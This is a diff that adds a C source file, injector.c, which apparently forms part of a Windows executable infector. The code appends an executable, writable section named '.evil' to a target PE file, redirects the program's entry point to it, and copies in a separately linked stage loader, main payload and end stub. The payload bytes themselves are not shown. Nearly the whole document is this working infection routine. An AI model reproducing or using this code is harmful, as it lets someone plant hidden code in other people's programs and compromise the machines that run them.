@@ -1,0 +1,191 @@
+// injector.c
+#include <windows.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <string.h>
+
+#define NEW_SECTION_NAME ".evil"
+#define PAYLOAD_SIZE 0x200
+
+#define DEBUG(msg) \
+    do { \
+        fprintf(stderr, "DEBUG (%s:%04d): %s\n", __FILE__, __LINE__, msg); \
+    } while (0)
+
+#define DEBUG_FMT(msg, ...) \
+    do { \
+        fprintf(stderr, "DEBUG (%s:%04d): " msg "\n", __FILE__, __LINE__, __VA_ARGS__); \
+    } while (0)
+
+#define FAIL_RET(msg, ret_val) \
+    do { \
+        if (msg) { \
+            fprintf(stderr, "ERROR (%s:%04d): %s\n", __FILE__, __LINE__, msg); \
+        } else { \
+            fprintf(stderr, "ERROR (%s:%04d): Unknown error\n", __FILE__, __LINE__); \
+        } \
+        if (GetLastError() != 0) { \
+            fprintf(stderr, "Last error: %lu\n", GetLastError()); \
+        } \
+        return (ret_val); \
+    } while (0)
+
+#define FAIL(msg) FAIL_RET(msg, -1)
+
+extern unsigned char stage_loader[];
+extern unsigned char stage_loader_end[];
+extern uint64_t delta;
+extern unsigned char end_stub[];
+extern unsigned char end_stub_end[];
+extern unsigned char main_payload[];
+extern unsigned char main_payload_end[];
+
+#define stage_loader_size (stage_loader_end - stage_loader)
+#define end_stub_size     (end_stub_end - end_stub)
+#define main_payload_size (main_payload_end - main_payload)
+
+int inject_payload(const char *target_path) {
+    if (!target_path || strlen(target_path) == 0) {
+        FAIL("Invalid target path");
+    }
+
+    // Open the target PE file
+    HANDLE hFile = CreateFileA(target_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        FAIL("Failed to open target file");
+    } else {
+        DEBUG("Target file opened successfully");
+    }
+
+    // Allocate memory for the file buffer in the heap
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    BYTE *fileBuffer = (BYTE *)HeapAlloc(GetProcessHeap(), 0, fileSize + 0x1000);
+    if (!fileBuffer) {
+        CloseHandle(hFile);
+        FAIL("Failed to allocate memory for file buffer");
+    } else {
+        DEBUG("Memory allocated for file buffer");
+    }
+
+    // Read the file into memory
+    DWORD bytesRead;
+    ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL);
+    if (bytesRead != fileSize) {
+        HeapFree(GetProcessHeap(), 0, fileBuffer);
+        CloseHandle(hFile);
+        FAIL("Failed to read the entire file into memory");
+    } else {
+        DEBUG("File read into memory successfully");
+    }
+
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)fileBuffer;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
+        FAIL("Invalid DOS signature");
+    } else {
+        DEBUG("DOS header : OK");
+        DEBUG_FMT("Magic number: %c%c (0x%04X)", dos->e_magic & 0xFF, (dos->e_magic >> 8) & 0xFF, dos->e_magic);
+    }
+
+    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(fileBuffer + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) {
+        FAIL("Invalid NT signature");
+    } else {
+        DEBUG("NT headers : OK");
+        DEBUG_FMT("NT Signature: %c%c (0x%08X)", nt->Signature & 0xFF, (nt->Signature >> 8) & 0xFF, nt->Signature);
+        DEBUG_FMT("Number of Sections: %d", nt->FileHeader.NumberOfSections);
+    }
+
+    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);
+
+    DWORD newSectionVA = sections[nt->FileHeader.NumberOfSections - 1].VirtualAddress +
+                         sections[nt->FileHeader.NumberOfSections - 1].Misc.VirtualSize;
+    newSectionVA = (newSectionVA + 0xFFF) & ~0xFFF;
+
+    DWORD newSectionRaw = sections[nt->FileHeader.NumberOfSections - 1].PointerToRawData +
+                          sections[nt->FileHeader.NumberOfSections - 1].SizeOfRawData;
+    newSectionRaw = (newSectionRaw + 0x1FF) & ~0x1FF;
+
+    DEBUG_FMT("New section VA: 0x%08X", newSectionVA);
+    DEBUG_FMT("New section Raw: 0x%08X", newSectionRaw);
+
+    DWORD totalPayloadSize = stage_loader_size + main_payload_size + end_stub_size;
+
+    DEBUG_FMT("Stage loader size: %llu bytes", stage_loader_size);
+    DEBUG_FMT("Main payload size: %llu bytes", main_payload_size);
+    DEBUG_FMT("End stub size: %llu bytes", end_stub_size);
+    DEBUG_FMT("Total payload size: %lu bytes", totalPayloadSize);
+
+    IMAGE_SECTION_HEADER *newSection = &sections[nt->FileHeader.NumberOfSections];
+    memset(newSection, 0, sizeof(IMAGE_SECTION_HEADER));
+    memcpy(newSection->Name, NEW_SECTION_NAME, 5);
+    newSection->VirtualAddress = newSectionVA;
+    newSection->Misc.VirtualSize = totalPayloadSize;
+    newSection->PointerToRawData = newSectionRaw;
+    newSection->SizeOfRawData = totalPayloadSize;
+    newSection->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;
+
+    nt->OptionalHeader.SizeOfImage = newSectionVA + totalPayloadSize;
+
+    DWORD oldEntryPoint = nt->OptionalHeader.AddressOfEntryPoint;
+    nt->OptionalHeader.AddressOfEntryPoint = newSectionVA;
+
+    DEBUG_FMT("Old Entry Point: 0x%08X", oldEntryPoint);
+    DEBUG_FMT("New Entry Point: 0x%08X", nt->OptionalHeader.AddressOfEntryPoint);
+
+    ++nt->FileHeader.NumberOfSections;
+
+    DEBUG("New section created successfully");
+
+    // Prepare the payload buffer
+    // Allocate payload buffer
+    BYTE *payload = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalPayloadSize);
+    if (!payload) {
+        printf("Failed to allocate payload buffer\n");
+        return -1;
+    }
+
+    // Copy stage_loader and main_payload sequentially
+    memcpy(payload, stage_loader, stage_loader_size);
+    memcpy(payload + stage_loader_size, main_payload, main_payload_size);
+    memcpy(payload + stage_loader_size + main_payload_size, end_stub, end_stub_size);
+
+    // Calculate delta offset in stage_loader
+    size_t delta_offset = (size_t)((BYTE *)&delta - stage_loader);
+    DEBUG_FMT("Delta offset in stage_loader: %llu bytes", delta_offset);
+
+    // Calculate offset of main_payload relative to start of stage_loader in payload buffer
+    uint64_t delta_value = (uint64_t)(stage_loader_size);
+    DEBUG_FMT("Delta value to inject: 0x%llX", delta_value);
+
+    // Patch delta in stage_loader inside payload buffer
+    memcpy(payload + delta_offset, &delta_value, sizeof(uint64_t));
+
+    uint64_t patched_delta;
+    memcpy(&patched_delta, payload + delta_offset, sizeof(uint64_t));
+    printf("Patched delta value: 0x%llx\n", patched_delta);
+
+    // Copy the payload into the file buffer at the new section's raw offset
+    memcpy(fileBuffer + newSectionRaw, payload, totalPayloadSize);
+
+    // Write the modified file buffer back to the target file
+    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+    DWORD bytesWritten;
+    WriteFile(hFile, fileBuffer, newSectionRaw + totalPayloadSize, &bytesWritten, NULL);
+
+    CloseHandle(hFile);
+    HeapFree(GetProcessHeap(), 0, fileBuffer);
+    HeapFree(GetProcessHeap(), 0, payload);
+
+    DEBUG("Payload injected successfully");
+    return 0;
+}
+
+int main(int argc, char **argv) {
+    if (argc != 2) {
+        printf("Usage: %s <target_pe.exe>\n", argv[0]);
+        FAIL("Invalid number of arguments");
+    }
+
+    inject_payload(argv[1]);
+    return 0;
+}
